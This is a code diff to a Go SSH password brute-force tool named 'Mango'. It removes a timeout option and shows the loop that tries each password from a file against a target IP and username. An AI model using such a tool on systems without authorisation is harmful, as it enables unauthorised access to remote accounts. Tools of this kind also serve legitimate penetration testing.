@@ -12,7 +12,7 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-func checkPassword(username string, password string, ip string, port string, timeout int) bool {
+func checkPassword(username string, password string, ip string, port string) bool {
 	address := ip + ":" + port
 
 	config := &ssh.ClientConfig{
@@ -38,7 +38,6 @@ func main() {
 
 	var targetIP *string = parser.String("i", "ip", &argparse.Options{Required: true, Help: "IP to target"})
 	var port *string = parser.String("p", "port", &argparse.Options{Required: false, Help: "Port", Default: "22"})
-	var timeout *int = parser.Int("t", "time-out", &argparse.Options{Required: false, Help: "Timeout (in seconds)", Default: 10})
 
 	var username *string = parser.String("u", "username", &argparse.Options{Required: true, Help: "Username to bruteforce"})
 	var passwordFile *string = parser.String("", "password-file", &argparse.Options{Required: true, Help: "Path to file of passwords"})
@@ -79,7 +78,7 @@ func main() {
 	fmt.Println("Mango Started at: ", startTime.Format(time.UnixDate))
 
 	for _, pw := range passwordsToCheck {
-		if checkPassword(*username, pw, *targetIP, *port, *timeout) {
+		if checkPassword(*username, pw, *targetIP, *port) {
 			fmt.Println("Mango found a password: ")
 			fmt.Print(*username + ":")
 			color.Green(pw)
